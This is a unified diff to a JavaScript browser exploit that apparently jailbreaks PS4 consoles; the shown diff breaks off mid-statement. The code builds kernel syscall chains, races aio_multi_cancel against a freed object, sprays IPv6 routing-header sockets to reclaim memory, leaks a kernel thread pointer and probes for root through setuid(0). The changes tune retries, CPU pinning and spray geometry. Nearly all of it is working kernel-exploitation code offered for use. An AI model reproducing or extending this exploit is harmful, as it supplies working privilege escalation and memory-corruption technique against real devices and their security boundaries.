@@ -24,6 +24,8 @@ const stateEl = _hostCons.stateEl;
 const lines = [];
 let passCount = 0,
   failCount = 0;
+let armedEver = false;
+let alreadyLoaded = false;
 const params = new URLSearchParams(location.search);
 const STOP_BEFORE_DOUBLE = params.get("stop") === "beforedouble";
 
@@ -103,13 +105,13 @@ function mark(tag, detail) {
       .map(function (l) {
         l = esc(l);
         const c =
-          /FAIL|ERROR|THREW|REBOOT|MISS|LOST|POISON|TIMEOUT|MISMATCH|ABORTED/i.test(
+          /FAIL|ERROR|THREW|REBOOT|MISS|LOST|POISON|TIMEOUT|MISMATCH|ABORTED|GIVEUP|NO-STORAGE|UNSEEN/i.test(
             l,
           )
             ? "bad"
-            : /WARN|SKIP|REFUSED|COMMITTED|DIRTY/i.test(l)
+            : /WARN|SKIP|REFUS|COMMITTED|DIRTY/i.test(l)
               ? "warn"
-              : /\bOK\b|PASS|ACHIEVED|RUNNING|ARMED/i.test(l)
+              : /\bOK\b|\bPASS\b|PASS=|ACHIEVED|RUNNING|ARMED/i.test(l)
                 ? "ok"
                 : "";
         return c ? '<span class="' + c + '">' + l + "</span>" : l;
@@ -142,7 +144,6 @@ function check(name, ok, detail) {
 
 const SYS = {
   getpid: 20,
-  setuid: 0x17,
   getuid: 0x18,
   close: 6,
   socket: 97,
@@ -162,6 +163,7 @@ const SYS = {
   aio_multi_wait: 663,
   aio_multi_cancel: 666,
   aio_submit_cmd: 669,
+  write: 4,
   sysctl: 202,
   kill: 37,
   getppid: 39,
@@ -177,8 +179,7 @@ let jbRestoreHook = null;
 let allDone = false,
   jailbroken = false,
   kpatched = false,
-  payloadRunning = false,
-  alreadyLoaded = false;
+  payloadRunning = false;
 
 (async function () {
   let p = null;
@@ -189,19 +190,12 @@ let allDone = false,
     await new Promise(function (r) {
       setTimeout(r, 100);
     });
-
+	  
     const { key, off } = offsetsFor(navigator.userAgent);
+    mark("BUILD", "jb=skipjb2 base=ef1670a");
     mark("FW", key || "(not a PS4 UA)");
     if (!off) {
       state("no offsets for this firmware", "bad");
-      var m = document.getElementById("msgs");
-      if (m) {
-        m.innerHTML =
-          'No offsets for this firmware: <span style="color: red;">' +
-          (key || "Unknown") +
-          "</span>";
-      }
-      mark("NO-OFFSETS", key || "unknown");
       return;
     }
     const fwKey = key || "unknown";
@@ -209,6 +203,7 @@ let allDone = false,
     const DO_JB = params.get("jb") !== "0";
     const DO_PATCH = params.get("patch") !== "0";
     const DO_PAYLOAD = params.get("payload") !== "0";
+    const SKIPJB = params.get("skipjb") !== "0";
 
     const KEEP_JB = params.get("keepjb") === "1";
 
@@ -295,13 +290,13 @@ let allDone = false,
     // A hard KP (a total reclaim miss that faults inside the cancel walk)
     // cannot be caught here and still needs a reboot -- this only recovers
     // the benign, detectable misses.
-    const RETRY_MAX = params.get("retry")
-      ? parseInt(params.get("retry"), 10)
-      : 8;
+    const retryArg = parseInt(params.get("retry") || "", 10);
+    const RETRY_MAX = Number.isFinite(retryArg) && retryArg >= 0 ? retryArg : 4;
     const RETRY_KEY = "jb1352-read-retry";
     const retryCount = () => {
       try {
-        return parseInt(sessionStorage.getItem(RETRY_KEY) || "0", 10) || 0;
+        const v = parseInt(sessionStorage.getItem(RETRY_KEY) || "0", 10);
+        return Number.isFinite(v) && v > 0 ? v : 0;
       } catch (e) {
         return 0;
       }
@@ -315,24 +310,26 @@ let allDone = false,
       const n = retryCount();
       if (n >= RETRY_MAX) {
         mark(
-          "AUTO-RETRY-GIVEUP",
-          "why=" + why + " after " + n + " reloads -- reboot and try again",
+          "AUTO-RELOAD-GIVEUP",
+          "why=" + why + " reloads=" + n + " -- reboot and try again",
         );
         return false;
       }
+      let stored = -1;
       try {
         sessionStorage.setItem(RETRY_KEY, String(n + 1));
-      } catch (e) {}
-      mark(
-        "AUTO-RETRY",
-        "why=" +
-          why +
-          " reload " +
-          (n + 1) +
-          "/" +
-          RETRY_MAX +
-          " (benign read miss, no kernel write yet)",
-      );
+        stored = parseInt(sessionStorage.getItem(RETRY_KEY) || "-1", 10);
+      } catch (e) {
+        stored = -1;
+      }
+      if (stored !== n + 1) {
+        mark(
+          "AUTO-RELOAD-NO-STORAGE",
+          "why=" + why + " wrote=" + (n + 1) + " read=" + stored,
+        );
+        return false;
+      }
+      mark("AUTO-RELOAD", "why=" + why + " reload=" + (n + 1) + "/" + RETRY_MAX);
       setTimeout(() => {
         try {
           location.reload();
@@ -341,10 +338,7 @@ let allDone = false,
       return true;
     };
     if (retryCount() > 0)
-      mark(
-        "AUTO-RETRY-RESUME",
-        "read-phase retry " + retryCount() + "/" + RETRY_MAX,
-      );
+      mark("AUTO-RELOAD-RESUME", "reload=" + retryCount() + "/" + RETRY_MAX);
 
     state("running the primitive...", "warn");
     await new Promise((r) => setTimeout(r, 0));
@@ -584,6 +578,7 @@ let allDone = false,
       const a = new int64(r.lo, r.hi);
       return a.hi === 0 && a.low === 0 ? -1 : p.read4(a) | 0;
     }
+
     const pid = sc(SYS.getpid).i32;
     check(
       "chain-reaches-kernel",
@@ -591,22 +586,47 @@ let allDone = false,
       "pid=" + pid + " uid=" + sc(SYS.getuid).i32,
     );
 
-    try {
-      const uid0 = sc(SYS.getuid).i32;
-      const su0 = sc(SYS.setuid, 0).i32;
-      if (uid0 === 0 || su0 === 0) {
-        alreadyLoaded = true;
-        payloadRunning = true;
-        allDone = true;
-        mark("ALREADY-ROOT", "getuid=" + uid0 + " setuid(0)=" + su0);
-        hostAlready();
-        return;
+    if (SKIPJB) {
+      const SETUID = 23;
+      if (!stubAddr.has(SETUID))
+        for (let o = 0; o < off.k_scan_stage1; o += 16) {
+          const v = p.read8(libkernelBase.add32(o));
+          if ((v.low & 0x00ffffff) !== 0xc0c748 || v.hi >>> 24 !== 0x49)
+            continue;
+          if (
+            ((v.low >>> 24) | ((v.hi & 0x00ffffff) << 8)) >>> 0 ===
+            SETUID
+          ) {
+            stubAddr.set(SETUID, libkernelBase.add32(o));
+            break;
+          }
+        }
+      if (!stubAddr.has(SETUID)) {
+        mark("JB-PROBE", "stub=absent skip=impossible");
+      } else {
+        const suRv = sc(SETUID, 0).i32;
+        const uidNow = sc(SYS.getuid).i32;
+        mark("JB-PROBE", "setuid=" + suRv + " uid=" + uidNow);
+        if (suRv === 0 && uidNow === 0) {
+          alreadyLoaded = true;
+          jailbroken = true;
+          payloadRunning = true;
+          allDone = true;
+          mark(
+            "JB-ALREADY",
+            "kernel already patched -- 663 race skipped, pid=" + pid,
+          );
+          mark(
+            "EG-VERDICT",
+            "fw=" +
+              fwKey +
+              " jailbroken=1 kpatched=already payload_running=0" +
+              " armings=0 reused=1 already=1",
+          );
+          hostAlready();
+          return;
+        }
       }
-    } catch (eAlready) {
-      mark(
-        "ALREADY-CHECK-THREW",
-        (eAlready && eAlready.message) || String(eAlready),
-      );
     }
 
     const scratchAb = new ArrayBuffer(0x1000);
@@ -663,11 +683,14 @@ let allDone = false,
       SOCK_DGRAM = 2,
       AF_UNIX = 1,
       SOCK_STREAM = 1;
-    const RTH_SIZE = 0x48,
-      RTH_LEN = 8,
-      RTH_SEGLEFT = 4;
-    const NODE0_DEC = 0x04000800,
-      SCRATCH_PAGE = 0x04000000;
+    const numArg = parseInt(params.get("num") || "", 10);
+    const NUM = Number.isFinite(numArg) && numArg >= 2 && numArg <= 128 ? numArg : 9;
+    const RTH_N = NUM > 2 ? 16 : 4;
+    const RTH_SIZE = 16 * RTH_N + 8,
+      RTH_LEN = 2 * RTH_N,
+      RTH_SEGLEFT = RTH_N;
+    const SCRATCH_PAGE = (RTH_N << 24) >>> 0,
+      NODE0_DEC = ((RTH_N << 24) | (RTH_LEN << 8)) >>> 0;
     const SYS_MMAP = 477;
     const PROT_RW = 3,
       MAP_PRIVATE = 2,
@@ -679,7 +702,21 @@ let allDone = false,
     const SPIN = params.get("spin")
       ? parseInt(params.get("spin"), 10)
       : 40000000;
-    mark("PR-CFG", "nleak=" + N_LEAK + " spray=" + SPRAY + " spin=" + SPIN);
+    const CUT = params.get("cut") !== "0";
+    const CUT_MARGIN = params.get("cutmargin")
+      ? parseInt(params.get("cutmargin"), 10)
+      : 8192;
+    mark(
+      "PR-CFG",
+      "nleak=" +
+        N_LEAK +
+        " spray=" +
+        SPRAY +
+        " spin=" +
+        SPIN +
+        " cut=" +
+        (CUT ? CUT_MARGIN : 0),
+    );
 
     async function bringWorker(name) {
       const w = { name: name, armed: false, wired: false };
@@ -750,6 +787,49 @@ let allDone = false,
         sc(SYS.getpid).i32,
     );
 
+    const zoneOf = (s) => {
+      const r = s & 15 ? (s + 16) & ~15 : s;
+      let z = 16;
+      while (z < r) z <<= 1;
+      return z;
+    };
+    const geomOk =
+      RTH_SIZE === 8 * (RTH_LEN + 1) &&
+      (RTH_LEN & 1) === 0 &&
+      RTH_LEN !== 0 &&
+      RTH_SEGLEFT === RTH_LEN / 2 &&
+      NODE0_DEC === (((RTH_SEGLEFT << 24) | (RTH_LEN << 8)) >>> 0) &&
+      NODE0_DEC >= SCRATCH_PAGE &&
+      NODE0_DEC < SCRATCH_PAGE + 0x10000 - 4 &&
+      !(NODE0_DEC >= SCRATCH_PAGE + (NUM > 2 ? 0x8000 : 0x2000) &&
+        NODE0_DEC < SCRATCH_PAGE + (NUM > 2 ? 0x8000 : 0x2000) + RTH_SIZE) &&
+      zoneOf(NUM * 0x38) === zoneOf(RTH_SIZE);
+    if (
+      !check(
+        "pr-geometry-consistent",
+        geomOk,
+        "num=" +
+          NUM +
+          " victim=0x" +
+          (NUM * 0x38).toString(16) +
+          " rth=0x" +
+          RTH_SIZE.toString(16) +
+          " len=" +
+          RTH_LEN +
+          " segleft=" +
+          RTH_SEGLEFT +
+          " zone=" +
+          zoneOf(NUM * 0x38) +
+          "/" +
+          zoneOf(RTH_SIZE) +
+          " scratch=0x" +
+          SCRATCH_PAGE.toString(16) +
+          " node0_dec=0x" +
+          NODE0_DEC.toString(16),
+      )
+    )
+      return;
+
     const mr = sc(
       SYS_MMAP,
       SCRATCH_PAGE,
@@ -781,7 +861,7 @@ let allDone = false,
       tDv.setUint8(1, RTH_LEN);
       tDv.setUint8(3, RTH_SEGLEFT);
       sc(SYS.setsockopt, vs, IPPROTO_IPV6, IPV6_RTHDR, bufAddr(tAb), RTH_SIZE);
-      const RT = SCRATCH_PAGE + 0x2000;
+      const RT = SCRATCH_PAGE + (NUM > 2 ? 0x8000 : 0x2000);
       lenDv.setUint32(0, RTH_SIZE, true);
       lenDv.setUint32(4, 0, true);
       const g1 = sc(
@@ -810,7 +890,7 @@ let allDone = false,
         return;
     }
 
-    const mAb = new ArrayBuffer(0x40);
+    const mAb = new ArrayBuffer(0xc0);
     keepAlive.push(mAb);
     const mU32 = new Uint32Array(mAb);
     keepAlive.push(mU32);
@@ -890,29 +970,43 @@ let allDone = false,
       )
     )
       return;
-    const PINCORE = params.get("core")
+    const coreArg = params.get("core")
       ? parseInt(params.get("core"), 10)
-      : cores[0];
-    new Uint8Array(mskAb).fill(0);
-    mskDv.setUint32(0, (1 << PINCORE) >>> 0, true);
-    const affSet = sc(
-      SYS.cpuset_setaffinity,
-      CPU_LEVEL_WHICH,
-      CPU_WHICH_TID,
-      ID64,
-      CPUSET_SZ,
-      mskAd,
-    ).i32;
-    new Uint8Array(mskAb).fill(0);
-    sc(
-      SYS.cpuset_getaffinity,
-      CPU_LEVEL_WHICH,
-      CPU_WHICH_TID,
-      ID64,
-      CPUSET_SZ,
-      mskAd,
-    );
-    const backMask = mskDv.getUint32(0, true) >>> 0;
+      : -1;
+    const candidates = coreArg >= 0 ? [coreArg] : cores.slice();
+    let PINCORE = -1,
+      affSet = -1,
+      backMask = 0;
+    for (const c of candidates) {
+      new Uint8Array(mskAb).fill(0);
+      mskDv.setUint32(0, (1 << c) >>> 0, true);
+      affSet = sc(
+        SYS.cpuset_setaffinity,
+        CPU_LEVEL_WHICH,
+        CPU_WHICH_TID,
+        ID64,
+        CPUSET_SZ,
+        mskAd,
+      ).i32;
+      new Uint8Array(mskAb).fill(0);
+      sc(
+        SYS.cpuset_getaffinity,
+        CPU_LEVEL_WHICH,
+        CPU_WHICH_TID,
+        ID64,
+        CPUSET_SZ,
+        mskAd,
+      );
+      backMask = mskDv.getUint32(0, true) >>> 0;
+      if (affSet === 0 && backMask === (1 << c) >>> 0) {
+        PINCORE = c;
+        break;
+      }
+      mark(
+        "PIN-REJECT",
+        "core=" + c + " rv=" + affSet + " back=0x" + backMask.toString(16),
+      );
+    }
     mark(
       "PIN-SET",
       "core=" +
@@ -920,12 +1014,15 @@ let allDone = false,
         " rv=" +
         affSet +
         " reads back 0x" +
-        backMask.toString(16),
+        backMask.toString(16) +
+        " tried=" +
+        candidates.join(","),
     );
+    if (PINCORE < 0 && retryBenign("pin-failed")) return;
     if (
       !check(
         "MAIN-PINNED",
-        affSet === 0 && backMask === (1 << PINCORE) >>> 0,
+        PINCORE >= 0,
         "core=" +
           PINCORE +
           " mask=0x" +
@@ -935,48 +1032,96 @@ let allDone = false,
     )
       return;
 
-    const OTHER =
-      cores.length > 1
-        ? cores[0] === PINCORE
-          ? cores[cores.length - 1]
-          : cores[0]
-        : PINCORE;
+    const otherCores = cores.filter((c) => c !== PINCORE);
     const msk2Ab = new ArrayBuffer(CPUSET_SZ);
     keepAlive.push(msk2Ab);
     const msk2Dv = new DataView(msk2Ab),
       msk2Ad = bufAddr(msk2Ab);
-    new Uint8Array(msk2Ab).fill(0);
-    msk2Dv.setUint32(0, (1 << OTHER) >>> 0, true);
-    let wpin = "skipped";
-    if (OTHER !== PINCORE) {
-      const aw = [CPU_LEVEL_WHICH, CPU_WHICH_TID, ID64, CPUSET_SZ, msk2Ad];
-      await w1.fire(SYS.cpuset_setaffinity, aw);
-      const r1 = w1.ctx.frameDv.getUint32(0, true) | 0;
-      await w2.fire(SYS.cpuset_setaffinity, aw);
-      const r2 = w2.ctx.frameDv.getUint32(0, true) | 0;
-      wpin = "w1=" + r1 + " w2=" + r2;
-      check(
+    const aw = [CPU_LEVEL_WHICH, CPU_WHICH_TID, ID64, CPUSET_SZ, msk2Ad];
+    async function pinWorker(w, c) {
+      new Uint8Array(msk2Ab).fill(0);
+      msk2Dv.setUint32(0, (1 << c) >>> 0, true);
+      await w.fire(SYS.cpuset_setaffinity, aw);
+      const rv = w.ctx.frameDv.getUint32(0, true) | 0;
+      new Uint8Array(msk2Ab).fill(0);
+      await w.fire(SYS.cpuset_getaffinity, aw);
+      const back = msk2Dv.getUint32(0, true) >>> 0;
+      return { rv: rv, back: back, ok: rv === 0 && back === (1 << c) >>> 0 };
+    }
+    let OTHER = -1,
+      wpin = "none";
+    for (let i = otherCores.length - 1; i >= 0; i--) {
+      const c = otherCores[i];
+      const p1 = await pinWorker(w1, c);
+      if (!p1.ok) {
+        mark(
+          "PIN-WREJECT",
+          "core=" + c + " w1=" + p1.rv + " back=0x" + p1.back.toString(16),
+        );
+        continue;
+      }
+      const p2 = await pinWorker(w2, c);
+      if (!p2.ok) {
+        mark(
+          "PIN-WREJECT",
+          "core=" + c + " w2=" + p2.rv + " back=0x" + p2.back.toString(16),
+        );
+        continue;
+      }
+      OTHER = c;
+      wpin = "w1=" + p1.rv + " w2=" + p2.rv + " back=0x" + p2.back.toString(16);
+      break;
+    }
+    mark(
+      "PIN-WSET",
+      "core=" + OTHER + " " + wpin + " tried=" + otherCores.join(","),
+    );
+    if (
+      !check(
         "WORKERS-PINNED",
-        r1 === 0 && r2 === 0,
+        OTHER >= 0,
         "workers on core " + OTHER + ", main on " + PINCORE + " -- " + wpin,
+      )
+    ) {
+      mark(
+        "PIN-REFUSE",
+        "no worker core verifies apart from main=" +
+          PINCORE +
+          "; sharing it is the configuration that hangs",
       );
-    } else {
-      mark("PIN-ONE-CORE", "only one core available, workers share it");
+      return;
     }
     mark("PIN-SPLIT", "main=" + PINCORE + " workers=" + OTHER + " " + wpin);
 
     pinRestore = function () {
-      new Uint8Array(mskAb).fill(0);
-      mskDv.setUint32(0, savedMask, true);
-      const r = sc(
-        SYS.cpuset_setaffinity,
-        CPU_LEVEL_WHICH,
-        CPU_WHICH_TID,
-        ID64,
-        CPUSET_SZ,
-        mskAd,
-      ).i32;
-      mark("PIN-RESTORED", "rv=" + r + " mask=0x" + savedMask.toString(16));
+      const permitted = (((1 << PINCORE) | (1 << OTHER)) >>> 0) || savedMask;
+      function apply(m) {
+        new Uint8Array(mskAb).fill(0);
+        mskDv.setUint32(0, m, true);
+        return sc(
+          SYS.cpuset_setaffinity,
+          CPU_LEVEL_WHICH,
+          CPU_WHICH_TID,
+          ID64,
+          CPUSET_SZ,
+          mskAd,
+        ).i32;
+      }
+      let used = savedMask,
+        r = apply(savedMask);
+      if (r !== 0 && permitted !== savedMask) {
+        used = permitted;
+        r = apply(permitted);
+      }
+      mark(
+        "PIN-RESTORED",
+        "rv=" +
+          r +
+          " mask=0x" +
+          used.toString(16) +
+          " saved=0x" +
+          savedMask.toString(16),
+      );
     };
 
     mark(
@@ -1004,20 +1149,21 @@ let allDone = false,
     opened.push(sp0, sp1);
     const rbAb = new ArrayBuffer(0x40);
     keepAlive.push(rbAb);
-    const rqAb = new ArrayBuffer(0x50);
+    const rqAb = new ArrayBuffer(NUM * 0x28);
     keepAlive.push(rqAb);
     const rqDv = new DataView(rqAb);
-    for (let k = 0; k < 2; k++) {
+    for (let k = 0; k < NUM; k++) {
       const b = k * 0x28;
       put(rqDv, b + 0x08, 0x40);
       put(rqDv, b + 0x10, bufAddr(rbAb));
       rqDv.setInt32(b + 0x20, sp0, true);
     }
-    const idAb2 = new ArrayBuffer(8);
+    const idAb2 = new ArrayBuffer(NUM * 4);
     keepAlive.push(idAb2);
     const idAd2 = bufAddr(idAb2);
-    const stAb2 = new ArrayBuffer(8);
+    const stAb2 = new ArrayBuffer(NUM * 4);
     keepAlive.push(stAb2);
+    const stDv2 = new DataView(stAb2);
     const stAd2 = bufAddr(stAb2);
     const toAb = new ArrayBuffer(8);
     keepAlive.push(toAb);
@@ -1043,7 +1189,10 @@ let allDone = false,
       POOL.push(fd);
       opened.push(fd);
     }
-    mark("PR-POOL", "reclaim sockets=" + POOL.length);
+    mark(
+      "PR-POOL",
+      "reclaim sockets=" + POOL.length + " mad=" + M_AD + " lkad=" + lkAd,
+    );
     const pAb = new ArrayBuffer(RTH_SIZE);
     keepAlive.push(pAb);
     const pDv = new DataView(pAb),
@@ -1056,6 +1205,20 @@ let allDone = false,
       put(pDv, 0x10, M_AD);
       put(pDv, 0x30, nextAddr);
     }
+
+    const N0DEC = params.get("n0dec") !== "0";
+    const SOL_SOCKET = 0xffff,
+      SO_TYPE = 0x1008;
+    const n0dAb = new ArrayBuffer(8);
+    keepAlive.push(n0dAb);
+    const n0dDv = new DataView(n0dAb),
+      n0dAd = bufAddr(n0dAb);
+    function presetNode0Dec() {
+      n0dDv.setUint32(0, 4, true);
+      n0dDv.setUint32(4, 0, true);
+      return sc(SYS.getsockopt, POOL[0], SOL_SOCKET, SO_TYPE, NODE0_DEC, n0dAd)
+        .i32;
+    }
     let armCount = 0;
     let waitMs = -1;
 
@@ -1063,7 +1226,26 @@ let allDone = false,
     const REAP = params.get("reap") !== "0";
     const REAPLEAK = params.get("reapleak") !== "0";
     const PARK = params.get("park") === "1";
+    const LEAKRETRY = params.get("leakretry") === "1";
+    const TRACEARM1 = params.get("tracearm1") === "1";
+    if (NUM > 2 && !(REAP && REAPLEAK)) {
+      mark("PR-REFUSE", "num=" + NUM + " needs reap=1 reapleak=1");
+      return;
+    }
+    let FAKEMISS = params.has("fakemiss")
+      ? parseInt(params.get("fakemiss"), 10)
+      : -1;
+    if (FAKEMISS >= 4) {
+      mark("PR-FAKEMISS-REFUSED", "arming=" + FAKEMISS + " writes_kernel");
+      FAKEMISS = -1;
+    }
+    if (FAKEMISS >= 0)
+      mark(
+        "PR-FAKEMISS",
+        "arming=" + FAKEMISS + " armings_are_1_based leak_arming=1",
+      );
     let reapedGen = -1;
+    let reapAt = 0;
     function armOnce() {
       try {
         if (typeof A !== "undefined" && A) A.busy = 1;
@@ -1081,7 +1263,7 @@ let allDone = false,
         SYS.aio_submit_cmd,
         1 | 0x1000,
         bufAddr(rqAb),
-        2,
+        NUM,
         3,
         idAd2,
       ).i32;
@@ -1102,9 +1284,9 @@ let allDone = false,
           toAd,
       );
       const tw0 = Date.now();
-      sc(SYS.aio_multi_wait, idAd2, 2, stAd2, 0, toAd);
+      sc(SYS.aio_multi_wait, idAd2, NUM, stAd2, 0, toAd);
+      armedEver = true;
       waitMs = Date.now() - tw0;
-      at("ARM-P4-SPRAY", "wait=" + waitMs + "ms");
       let n = 0;
       for (const fd of POOL)
         if (
@@ -1121,6 +1303,9 @@ let allDone = false,
     keepAlive.push(lkNodes);
     const lkNdv = new DataView(lkNodes),
       lkNad = bufAddr(lkNodes);
+    const lkF64 = new Float64Array(lkNodes);
+    const NEXT_F64 = 0x30 / 8,
+      STRIDE_F64 = NODE_SZ / 8;
     async function leakCurthread(w) {
       toDv.setUint32(0, TOWAIT, true);
       toDv.setUint32(4, 0, true);
@@ -1137,6 +1322,11 @@ let allDone = false,
       mU32[6] = 4;
       mU32[7] = 0;
       setNode0(lkNad, LC);
+      if (N0DEC) {
+        const pr0 = presetNode0Dec();
+        mark("PR-N0DEC", "rv=" + pr0 + " at=0x" + NODE0_DEC.toString(16));
+        if (pr0 !== 0) return null;
+      }
       const a = armOnce();
       if (a.indexOf("ok") !== 0) {
         mark("PR-LEAK-ARM", w.name + " " + a);
@@ -1146,7 +1336,7 @@ let allDone = false,
       {
         let wu = 0;
         for (let i = 0; i < 200000; i++) {
-          mU8[0x30 + (i & 15)] = i & 0xff;
+          mU8[0x80 + (i & 15)] = i & 0xff;
           wu ^= mU32[OWNER_LO];
         }
         if (wu === 0x7fffffff) mark("PR-WARM", "" + wu);
@@ -1160,7 +1350,7 @@ let allDone = false,
         pr = w.fire(SYS.aio_multi_cancel, [idAd2, 1, stAd2]);
       } catch (e) {}
       for (let i = 0; i < SPIN; i++) {
-        mU8[0x30 + (i & 15)] = i & 0xff;
+        mU8[0x80 + (i & 15)] = i & 0xff;
         const hi1 = mU32[OWNER_HI];
         if (hi1 !== 0) {
           const lo = mU32[OWNER_LO];
@@ -1182,6 +1372,20 @@ let allDone = false,
         }
       }
       const drop = 0x40000000 - lkDv.getInt32(0x00, true);
+      let cutAt = -1,
+        cutTries = 0;
+      if (CUT) {
+        for (let m = CUT_MARGIN; m <= CUT_MARGIN << 3; m <<= 1) {
+          const at = 0x40000000 - lkDv.getInt32(0x00, true) + m;
+          if (at >= N_LEAK - 1) break;
+          cutTries++;
+          lkF64[at * STRIDE_F64 + NEXT_F64] = 0;
+          if (0x40000000 - lkDv.getInt32(0x00, true) < at) {
+            cutAt = at;
+            break;
+          }
+        }
+      }
       const uniq = {};
       for (const v of samples) uniq[v] = (uniq[v] || 0) + 1;
       const keys = Object.keys(uniq);
@@ -1202,22 +1406,49 @@ let allDone = false,
       try {
         if (pr) await pr;
       } catch (e) {}
+      mark(
+        "PR-WALK-DONE",
+        w.name +
+          " walked=" +
+          (0x40000000 - lkDv.getInt32(0x00, true)) +
+          "/" +
+          N_LEAK +
+          " broke_at=" +
+          drop +
+          " cut=" +
+          cutAt +
+          " tries=" +
+          cutTries,
+      );
       if (!hits || hitHi >>> 0 < 0xffff0000 || keys.length !== 1) return null;
       return new int64(hitLo >>> 0, hitHi >>> 0);
     }
+    if (TRACEARM1) armTrace = true;
     const CT1 = await leakCurthread(w1);
     armTrace = true;
 
+    put(lkNdv, 0x00, LX);
+    put(lkNdv, 0x08, LC);
+    put(lkNdv, 0x30, 0);
     if (REAPLEAK) {
-      put(lkNdv, 0x00, LX);
-      put(lkNdv, 0x08, LC);
-      put(lkNdv, 0x30, 0);
-      const rlc = sc(SYS.aio_multi_cancel, idAd2, 2, stAd2).i32;
-      const rlp = sc(SYS.aio_multi_poll, idAd2, 2, stAd2).i32;
-      const rld = sc(SYS.aio_multi_delete, idAd2, 2, stAd2).i32;
+      mark("PR-REAPLEAK-PRE", "node0 next=0 num=" + NUM);
+      const rlc = sc(SYS.aio_multi_cancel, idAd2, NUM, stAd2).i32;
+      mark("PR-REAPLEAK-C", "cancel=" + rlc);
+      const rlp = sc(SYS.aio_multi_poll, idAd2, NUM, stAd2).i32;
+      mark("PR-REAPLEAK-P", "poll=" + rlp);
+      const rld = sc(SYS.aio_multi_delete, idAd2, NUM, stAd2).i32;
       mark("PR-REAPLEAK", "cancel=" + rlc + " poll=" + rlp + " delete=" + rld);
+      reapAt = Date.now();
     } else {
       mark("PR-REAPLEAK", "skipped park=" + (PARK ? 1 : 0));
+    }
+
+    if (!CT1) {
+      mark("PR-LEAK-MISS", "ct1=null leakretry=" + (LEAKRETRY ? 1 : 0));
+      neutralise("leak-miss", 0);
+      if (LEAKRETRY && REAPLEAK && retryBenign("leak-miss")) return;
+      check("pointer-read-reached", false, "no curthread leak");
+      return;
     }
 
     mark(
@@ -1311,7 +1542,46 @@ let allDone = false,
       put(arDv, o + 0x30, last ? 0 : arAd.add32(o + NODE_SZ));
     }
 
-    const gfAb = new ArrayBuffer(0x80);
+    let lastFire = {
+      n0: 0,
+      fsock: -1,
+      fhits: 0,
+      faked: false,
+      label: "none",
+    };
+
+    function neutralise(where, sink) {
+      setNode0(0, sink);
+      let renew = 0;
+      for (const fd of POOL)
+        if (
+          sc(SYS.setsockopt, fd, IPPROTO_IPV6, IPV6_RTHDR, pAd, RTH_SIZE)
+            .i32 === 0
+        )
+          renew++;
+      mark(
+        "PR-NEUTRALISE-EARLY",
+        where + " next=0 on " + renew + "/" + POOL.length,
+      );
+    }
+
+    function fireOk(where) {
+      if (lastFire.n0 === 1 && lastFire.fsock >= 0) return true;
+      mark(
+        "REFUSING-TO-INTERPRET",
+        where +
+          " node0_sink=" +
+          lastFire.n0 +
+          " f_socket=" +
+          lastFire.fsock +
+          " forced=" +
+          (lastFire.faked ? 1 : 0),
+      );
+      neutralise(where, N0SINK);
+      return false;
+    }
+
+    const gfAb = new ArrayBuffer(RTH_SIZE);
     keepAlive.push(gfAb);
     const gfDv = new DataView(gfAb),
       gfAd = bufAddr(gfAb);
@@ -1348,9 +1618,21 @@ let allDone = false,
       if (!REAP || reapedGen === armCount) return;
       wnode(0, DUM, DUM, true);
       reapedGen = armCount;
-      const c = sc(SYS.aio_multi_cancel, idAd2, 2, stAd2).i32;
-      const p = sc(SYS.aio_multi_poll, idAd2, 2, stAd2).i32;
-      const d = sc(SYS.aio_multi_delete, idAd2, 2, stAd2).i32;
+      const c = sc(SYS.aio_multi_cancel, idAd2, NUM, stAd2).i32;
+      let stsC = "";
+      for (let k = 0; k < NUM; k++)
+        stsC +=
+          (k ? "," : "") + (stDv2.getUint32(k * 4, true) >>> 0).toString(16);
+      const p = sc(SYS.aio_multi_poll, idAd2, NUM, stAd2).i32;
+      let stsP = "";
+      for (let k = 0; k < NUM; k++)
+        stsP +=
+          (k ? "," : "") + (stDv2.getUint32(k * 4, true) >>> 0).toString(16);
+      const d = sc(SYS.aio_multi_delete, idAd2, NUM, stAd2).i32;
+      let sts = "";
+      for (let k = 0; k < NUM; k++)
+        sts += (k ? "," : "") + (stDv2.getUint32(k * 4, true) >>> 0).toString(16);
+      reapAt = Date.now();
       post(
         "REAP",
         tag +
@@ -1361,9 +1643,24 @@ let allDone = false,
           " poll=" +
           p +
           " delete=" +
-          d,
+          d +
+          " c=[" +
+          stsC +
+          "] p=[" +
+          stsP +
+          "] st=[" +
+          sts +
+          "]",
       );
     }
+
+    const firesArg = parseInt(params.get("fires") || "", 10);
+    const FIRES =
+      Number.isFinite(firesArg) && firesArg >= 1 && firesArg <= NUM - 1
+        ? firesArg
+        : NUM - 1;
+    let fireIdx = FIRES;
+    mark("PR-AMORTISE", "num=" + NUM + " fires_per_arming=" + FIRES);
 
     function runChain(nNodes, label) {
       snkDv.setInt32(0x00, 0x40000000, true);
@@ -1380,18 +1677,48 @@ let allDone = false,
       );
       mU32[OWNER_LO] = 4;
       mU32[OWNER_HI] = 0;
-      setNode0(arAd, N0SINK);
-      const a = armOnce();
-      if (a.indexOf("ok") !== 0) {
-        mark("PR-ARM-FAIL", label + " " + a);
-        return null;
+      let a = "ok reused";
+      if (fireIdx >= FIRES) {
+        const n0save = arAb.slice(0, NODE_SZ);
+        reapNow("pre-arm a=" + armCount);
+        new Uint8Array(arAb, 0, NODE_SZ).set(new Uint8Array(n0save));
+        setNode0(arAd, N0SINK);
+        a = armOnce();
+        if (a.indexOf("ok") !== 0) {
+          mark("PR-ARM-FAIL", label + " " + a);
+          return null;
+        }
+        fireIdx = 0;
+      } else {
+        setNode0(arAd, N0SINK);
       }
-      trace("CH-CANCEL", label + " nodes=" + nNodes + " walking");
-      sc(SYS.aio_multi_cancel, idAd2, 1, stAd2);
-      trace("CH-CANCEL-DONE", label + " returned");
+      const fireN = fireIdx;
+      sc(SYS.aio_multi_cancel, idAd2.add32(4 * fireIdx), 1, stAd2);
+      fireIdx++;
+      trace(
+        "CH-CANCEL-DONE",
+        label +
+          " nodes=" +
+          nNodes +
+          " fire=" +
+          fireN +
+          "/" +
+          FIRES +
+          " arm=" +
+          armCount +
+          " returned",
+      );
       const moved = 0x40000000 - snkDv.getInt32(0x00, true);
-      const n0 = 0x40000000 - snkDv.getInt32(0x20, true);
       const w = whoHasF();
+      const faked = FAKEMISS >= 0 && armCount === FAKEMISS;
+      const n0 = faked ? 0 : 0x40000000 - snkDv.getInt32(0x20, true);
+      lastFire = {
+        n0: n0,
+        fsock: w.idx,
+        fhits: w.hits,
+        faked: faked,
+        label: label,
+      };
       mark(
         "PR-FIRE",
         label +
